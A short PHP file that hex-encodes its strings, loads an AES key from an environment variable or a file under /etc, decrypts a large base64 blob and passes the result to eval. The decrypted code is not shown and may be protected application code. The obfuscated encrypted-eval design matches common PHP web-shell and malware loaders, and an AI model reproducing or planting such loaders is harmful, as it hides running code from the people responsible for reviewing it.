<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ZcGCENwuPH/0d56UHEqLkQ==');

$c=base64_decode(

'momSNkQD7wX2VtP2Sn0h9GvfQDiF+WfOiTj4g/oncW2zacT1Y+oN82Vy+XTnVrwp0RNiqulM0gVQ' .
'2TXrvs7CtFgULeG72H8DxcYe++ox8W/3MahLyoErccxB1veMghIORuNFKBP0tQsUmns8od90MY1r' .
'Vbjs0c+EYsDiQKXheUbQwzBKaDLyqshNeUCsXg8E0cSVs9HpvhriGHbzlMC57Cu9eAvwXOzYz0pI' .
'litWCFC292qdDDXeKnrHrPOaEDF9Vz/vSHi/7r4u8ALvaBOUU2hwGKBuruDsiNjgikzNn5MYrHd+' .
'P2fj24YiyxgucaBSeJoT9MCJrAI84lVoEGQAl77jzBLHUSKQ/iuJ4a+MC7aiV73t0Q0tiRBMGFMw' .
'XlBwsewZViTOF/xkoEGi1gq44jycLaSPe/eTee4kD+J8u2DH2b3aUNxn/IZKtwFU7HtfU26SRtCG' .
'jRb0vbYkJY6XVUHQOzW789IcV98ajY/CkMAuOwxBg+eIOMzGcJbDITw67BQWwOZEOSxUFQvn5rG4' .
'UikBiJC9XY5PeQwdzPPhKUL8v7/bE9Uq+gvIZ+SZGH349bx4msrQE89iN5pT23GKMH1sODyo4hbb' .
'0aWjkruLXbmzIeSLtPt/KbtDS9DZBfsDnZuZuTo9ZBObnZXjcCQmY0WNCeoJy6xwJxLxEwFRlhSj' .
'SQcBZl3z355XPRI8tAvtsEwZ1xCKBnt40lMUEC/GfjyWtHULNK6PZ4/EwOa24Q9QG7US9uhThHaf' .
'Xd6/YzvgbgJeoQr0y2aKsUQD0Z9nSJWq9kOX/rSkYGE1jI+LKxCvw8ednhE6X9sor4ae8IRwGac3' .
'm3488Jr8Hf08ShVF0Tsg3zUrW1ubCieirnnBv2eZPV6XkFPjK5olAe5lpKgS8mfYHamgE351YY/2' .
'W+ujNewCRwH5ta5fwgNZvTyeZO4YX/j8KcI6HKxAGrU8BSwsksjXKGz8mJf8KnSkQDP+A5aYF5k0' .
'KmpzzHgrNuOd4rGiLdysJHW//Oa/m7oPjrvt06SJg0E3l92lfm3KcD8Dw+hO9YFYWiZcUTCxSOVG' .
'lH/1eAvIbA6A6s86amh52hznunIQuMv4MmwymA4oSiSojjFKXRFR1QQCMhcrNZqi0hAJfZTIvElU' .
'eI8XTLFZhEkAeQKET4EdWbfD2vlHjHRun8PISGzfK0uZaWB5awImIky5uNMgeTxLy8rC5gAVkir+' .
'Ek1yOj5vTUR3IDwSTzeVYOUJV1XRhlTfGka6+rZZaSWRyQtrQdweP+aleAgdEbl/RAadhZxOC8iN' .
'5VZAG0+Jcmwx0RzV1OclVC/cemO3L8SX9utvwITti5p3w0Lri62xtruRlfZU61YErVKT+LwNMJ3X' .
'pih6xfiAI5u106jCzBo4WfZ5PazNM/ZV161N2p1Gr0ldFjMZmdpvJx178yYLACRCm4WE+aiRbk52' .
'iIENDGDxS3piG7sFls8M3vbr60ZN8qHhC+0EBcdzx9b3rmIBansSUkJBb3itQwRENhsjLtFDr7xp' .
'84rqILbrgUv3fxPue1eQWy+QzJhwHR8AGowntEZTRmwjLYHmSnj7g0w5SkKEPyIjFsg4ptYD3SV+' .
'0hMW6ucn7lxcQQTcLvU279UGZOkIRD+T064lrR0GzkxfPrV0TFMZsqJaYBm82lVSmyXwVSJH1hob' .
'KT3enS84HAAm1S2k48pGPfamQRSDehRaEvnyXyqAXNs/rR1jWH9/qXaERD95YuYOvEzlov8xkvib' .
'Sx8CclngS3oP/bdiHKdgPDg9LXbhNMurwnGtaznoP7QWDrN70HIjlSKR1S/YLHwH9ZDbFxyqW4bs' .
'iI5yN/C7Ok4wWmOH++V1VSaD94rghTu0a56cQX1UEWMRUYczbw+W+AqUQ+y9jVJ70JGDnA50Fsac' .
'0GwYElJjmR4981gOT4DvHm5n7aOSu9a+uioyUFw+6acBrei3J+HHVRzDwdq5S5VQ4wuhR9l6suqe' .
'QT3UMdTEVyQqNdWd6/Sq/grEGZTf5q2mNRgrw246HG3KImPPplWcOq/OoPFdOnYayzF86cS0OthB' .
'iopZGhjUkkWOV2U/I6Qkh9dGKVRryWlxQf/SzMCaAGUv4SJpAUTqOhZlwkT6lf8I7KyU0UqGUrPr' .
'px6C2wjvp7A3wQzu/zEXTlzq8Vy/XNgoKQc//Pg4Y4lyt7PT6jAQyjXSful9xvFVQYptOElHbEiD' .
'yekCttwd2vmSTyOt5mgtce0I0UFeIPJKvi43LJrTUC/D5AIA3B5hJxQ0zGT2skbIRC2t0Yb5jPiT' .
'm9+gxksn7Bqd9GfgYAIiHu2LuhlFsPRunoSNzqxcYVDwMA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

